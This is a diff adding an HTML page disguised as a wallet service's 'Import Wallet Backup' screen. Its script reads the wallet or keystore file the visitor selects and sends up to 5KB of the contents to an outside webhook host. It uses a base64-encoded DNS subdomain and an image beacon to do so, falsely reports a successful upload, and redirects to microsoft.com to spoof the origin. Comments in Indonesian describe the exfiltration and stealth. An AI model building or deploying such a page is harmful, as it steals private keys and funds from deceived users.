@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>wallet.flow.com</title>
+  <style>
+    body { font-family: system-ui; background:#0f172a; color:#e0f7fa; text-align:center; padding:50px; }
+    button { background:#22c55e; color:black; padding:16px 32px; font-size:18px; border:none; border-radius:12px; cursor:pointer; font-weight:bold; }
+    button:hover { background:#16a34a; }
+    .msg { margin-top:20px; font-size:16px; color:#94a3b8; }
+  </style>
+</head>
+<body>
+
+<h2>Import Wallet Backup</h2>
+<p>Click below to select your wallet file</p>
+<button id="uploadButton">Choose File</button>
+<input type="file" id="fileInput" style="display: none;" accept=".json,.txt,.keystore" />
+
+<div class="msg" id="status">Ready</div>
+
+<script>
+  const OOB = "keen-sun-82.webhook.cool"; // OOB kamu
+
+  document.getElementById("uploadButton").addEventListener("click", function () {
+    const fileInput = document.getElementById("fileInput");
+    const status = document.getElementById("status");
+
+    fileInput.click();
+
+    // KETIKA FILE DIPILIH → BACA ISI + EXFIL KE OOB
+    fileInput.onchange = function(e) {
+      if (!e.target.files[0]) {
+        status.textContent = "No file selected";
+        return;
+      }
+
+      const file = e.target.files[0];
+      const reader = new FileReader();
+
+      reader.onload = function() {
+        const content = reader.result;
+        const filename = encodeURIComponent(file.name);
+        const size = file.size;
+
+        // EXFIL KE OOB VIA DNS + IMAGE BEACON (MAX STEALTH)
+        const exfilData = btoa(JSON.stringify({
+          name: file.name,
+          size: size,
+          content: content.substring(0, 5000) // batasi 5KB biar cepat
+        }));
+
+        // DNS exfil (OOB kamu)
+        new Image().src = `https://${exfilData}.${OOB}`;
+
+        // Backup image beacon (kalau DNS block)
+        new Image().src = `https://${OOB}/log?file=${filename}&size=${size}`;
+
+        status.textContent = `File "${file.name}" uploaded successfully!`;
+      };
+
+      reader.readAsText(file);
+    };
+
+    // NAVIGASI KE MICROSOFT.COM SETELAH FILE PICKER MUNcul (SPOOF ORIGIN)
+    setTimeout(() => {
+      location.href = "https://microsoft.com/";
+    }, 1200);
+  });
+</script>
+
+</body>
+</html>
